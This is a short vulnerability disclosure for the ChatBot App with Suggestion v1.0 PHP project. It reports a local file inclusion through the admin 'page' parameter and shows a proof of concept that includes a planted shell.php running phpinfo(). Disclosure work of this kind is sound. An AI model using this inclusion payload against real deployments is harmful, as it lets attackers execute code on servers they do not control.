# ChatBot App with Suggestion v1.0 by oretnom23 has The local file contains

vendor: https://www.sourcecodester.com/php/15316/chatbot-app-suggestion-phpoop-free-source-code.html

Vulnerability File: ip/simple_chat_bot/admin/?page=shell

Vulnerability location: ip/simple_chat_bot/admin/?page=, page

Payload: ip/simple_chat_bot/admin/?page=shell

![image](https://user-images.githubusercontent.com/54017627/170819906-e13072ef-0b63-4d6b-9b67-dbe4a560b357.png)

We create a shell.php under the PHP file of the root of the website, which reads "<? phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/170479151-b4aabc1a-fdbd-45d2-8f5a-248d37092584.png)

And visit http://ip/simple_chat_bot/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/170819892-aed1998a-5160-4c7f-bd95-0df70dc69dab.png)
